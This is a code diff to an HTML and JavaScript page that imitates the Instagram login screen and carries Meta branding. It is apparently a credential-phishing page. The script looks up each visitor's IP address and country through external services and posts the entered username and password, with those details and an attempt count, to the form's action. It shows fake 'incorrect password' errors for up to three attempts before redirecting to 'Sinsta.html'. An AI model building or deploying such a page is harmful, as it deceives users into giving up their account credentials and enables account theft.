@@ -24,15 +24,15 @@
             width: 100%;
             max-width: 350px;
             padding: 20px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            border-radius: 10px;
+            background-color: #fff;
         }
 
         .login-box {
             width: 100%;
-            background-color: #fff;
             padding: 20px;
-            border: 1px solid #dbdbdb;
             text-align: center;
-            margin-bottom: 10px;
         }
 
         h1 {
@@ -131,6 +131,9 @@
             padding: 20px;
             width: 100%;
             text-align: center;
+            border-radius: 4px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            margin-top: 10px;
         }
 
         .signup-link a {
@@ -154,49 +157,75 @@
             height: 14px;
             vertical-align: middle;
         }
+
+        .country-info {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-top: 10px;
+            text-align: center;
+        }
     </style>
     <script>
         let attempts = 0;
         let userIp = '';
         let userCountry = '';
 
-        // Get user's IP and country using ipinfo.io
-        fetch('https://ipinfo.io?token=YOUR_TOKEN_HERE')
-            .then(response => response.json())
-            .then(data => {
-                userIp = data.ip;
-                userCountry = data.country;
-            })
-            .catch(err => console.log(err));
+        // Function to fetch user's IP address
+        function fetchUserIp() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userIp = data.ip;
+                    document.getElementById('country-info').textContent = `Your IP address is ${userIp}. Fetching country info...`;
+                    fetchUserCountry(userIp);
+                })
+                .catch(err => console.error('Failed to fetch IP address:', err));
+        }
+
+        // Function to fetch country using IP address
+        function fetchUserCountry(ip) {
+            fetch(`https://ipinfo.io/${ip}/json?token=YOUR_TOKEN_HERE`)
+                .then(response => response.json())
+                .then(data => {
+                    userCountry = data.country;
+                    document.getElementById('country-info').textContent = `You are logging in from ${userCountry}`;
+                })
+                .catch(err => console.error('Failed to fetch country info:', err));
+        }
 
         function handleLogin(event) {
             event.preventDefault();
             attempts++;
             const errorMessage = document.getElementById('error-message');
 
-            // Send form data including attempts, IP, and country
             const form = document.getElementById('login-form');
             const formData = new FormData(form);
             formData.append('attempts', attempts);
             formData.append('ip', userIp);
             formData.append('country', userCountry);
-            formData.append('from', 'instagram'); // Add "From Instagram" parameter
+            formData.append('from', 'instagram');
 
             fetch(form.action, {
                 method: 'POST',
                 body: formData
             }).then(response => response.json())
               .then(data => {
-                  if (attempts < 3) {
-                      errorMessage.textContent = 'Incorrect password. Please try again.';
+                  if (data.success) {
+                      window.location.href = 'Sinsta.html';
+                  } else if (attempts < 3) {
+                      errorMessage.textContent = 'Incorrect username or password. Please try again.';
                   } else {
                       window.location.href = 'Sinsta.html';
                   }
               })
-              .catch(error => console.log(error));
+              .catch(error => {
+                  console.error('Login error:', error);
+                  errorMessage.textContent = 'An error occurred. Please try again later.';
+              });
         }
 
         document.addEventListener('DOMContentLoaded', () => {
+            fetchUserIp();
             const form = document.getElementById('login-form');
             form.addEventListener('submit', handleLogin);
         });
@@ -226,6 +255,7 @@
         <div class="meta-footer">
             <p>from <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Meta_Platforms_Inc._logo.svg" alt="Meta"></p>
         </div>
+        <div id="country-info" class="country-info"></div>
     </div>
 </body>
 </html>
